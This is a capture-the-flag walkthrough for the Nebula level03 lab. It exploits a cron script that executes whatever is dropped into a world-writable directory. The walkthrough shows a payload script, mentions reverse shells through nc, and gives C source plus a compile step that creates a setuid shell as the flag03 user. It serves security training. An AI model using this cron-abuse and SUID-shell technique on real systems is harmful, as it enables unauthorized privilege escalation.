**Intro**

This level presents us with a crontab that runs every couple minutes as user flag03

After looking at the script in the `/home/flag03/` folder, one might assume it is executing all files in the writable.d folder.


**Contents of /home/flag03**

```
﻿level03@nebula:/home/flag03$ ls -lah
total 5.5K
drwxr-x--- 3 flag03 level03  103 2011-11-20 20:39 .
drwxr-xr-x 1 root   root     120 2012-08-27 07:18 ..
-rw-r--r-- 1 flag03 flag03   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag03 flag03  3.3K 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag03 flag03   675 2011-05-18 02:54 .profile
drwxrwxrwx 2 flag03 flag03     3 2012-08-18 05:24 writable.d
-rwxr-xr-x 1 flag03 flag03    98 2011-11-20 21:22 writable.sh
```

**bash script: writable.sh**

```
﻿#!/bin/sh

for i in /home/flag03/writable.d/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

A quick an easy solution is to drop a shell script into the world writable `writable.d` folder and see what happens

**source: getflag.sh**

```
#!/bin/bash
/bin/getflag >> /tmp/out
```

which gives the following output

```
﻿level03@nebula:/home/flag03/writable.d$ cat /tmp/out
You have successfully executed getflag on a target account
```


That's good, and seems to solve the level, but what if we want more?  There are other ways.

`nc` is on the system.  Instead of running getflag from the script, we could open a reverse shell.  Unfortunately the version of `nc` on this system doesn't support the `-e` flag, so that kind of rules out this method.
There are other methods to get a reverse shell, without nc, which may be covered in later levels.


The next method that can actually get us a shell is a script to compile some code for us and suid that.

First, we need to know the uid of flag03

```
﻿level03@nebula:/home/flag03$ grep flag03 /etc/passwd
flag03:x:996:996::/home/flag03:/bin/sh
```

Then, we create the following code in /tmp, using `flag03's` uid

**Source: /tmp/shell.c**

```
﻿#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main ()
{
	setresuid(996, 996, 996);
	system("/bin/bash");
	return 0;
}

```

Next, we make a shell script to compile the code and mark it suid

**Source: /home/flag03/writable.d/compile.sh**

```
# /bin/bash
cc -o /home/flag03/shell /tmp/shell.c
chmod 4777 /home/flag03/shell
```

Once the compiler is executed, we'll see our suid application is waiting for us.  We can then execute and gain shell as the flag03 user.

```
﻿level03@nebula:/home/flag03$ ls
shell  writable.d  writable.sh
level03@nebula:/home/flag03$ ./shell
flag03@nebula:/home/flag03$ /bin/getflag
You have successfully executed getflag on a target account
```





